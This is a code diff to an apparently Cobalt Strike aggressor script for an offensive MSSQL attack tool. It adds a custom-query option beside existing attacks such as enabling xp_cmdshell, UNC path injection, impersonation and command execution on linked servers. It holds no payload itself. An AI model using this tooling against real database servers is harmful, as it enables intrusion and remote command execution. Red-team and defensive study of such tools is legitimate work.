@@ -62,6 +62,14 @@ sub runMSSQLAttacker {
 				$linkedServer = $3["ls"];
 				$command = "$command -ls $linkedServer";
 			}
+			if ($Attack eq "runCustomQuery"){
+				if ($3["customQuery"] eq $null) {
+					error("customQuery");
+					return;
+				}
+				$customQuery = $3["customQuery"];
+				$command = "$command -query \"$customQuery\"";
+			}
 			if ($Attack eq "execlinkedcmd"){
 				if ($3["ls"] eq $null || $3["cmd"] eq $null) {
 					error("Linked Server || CMD");
@@ -95,7 +103,7 @@ sub runMSSQLAttacker {
 	);
 	
 	dialog_description($dialog, "MSSQL-Attacker by Rikunj Sindhwad");
-	drow_combobox($dialog, "Attacks", "Attacks:", @("getinfo","checkimpersonate","checklinkedservers","checklinkedserverVersion","uncpathinject","enablecmdshell","enablelinkedcmdshell","execlinkedcmd","execcmd"));
+	drow_combobox($dialog, "Attacks", "Attacks:", @("getinfo","checkimpersonate","checklinkedservers","checklinkedserverVersion","uncpathinject","enablecmdshell","enablelinkedcmdshell","execlinkedcmd","execcmd","runCustomQuery"));
 	drow_text($dialog, "TargetInstance", "TargetInstance: ");
 	drow_text($dialog, "UserName", "[Optional] UserName: ");
 	drow_text($dialog, "Password", "[Optional] Password: ");
@@ -104,6 +112,7 @@ sub runMSSQLAttacker {
 	drow_text($dialog, "ls", "[Optional] Linked Server: ");
 	drow_text($dialog, "lh", "[Optional] LHOST (uncpathinject): ");
 	drow_text($dialog, "cmd", "[Optional] Command: ");
+	drow_text($dialog, "customQuery", "[Optional] Custom Query: ");
 	drow_checkbox($dialog, "ImpersonateSA", "Impersonate SA Before Attack", "ImpersonateSA");
 	drow_checkbox($dialog, "ImpersonateDBO", "Impersonate DBO Before Attack", "ImpersonateDBO");
 	dbutton_action($dialog, "Run");
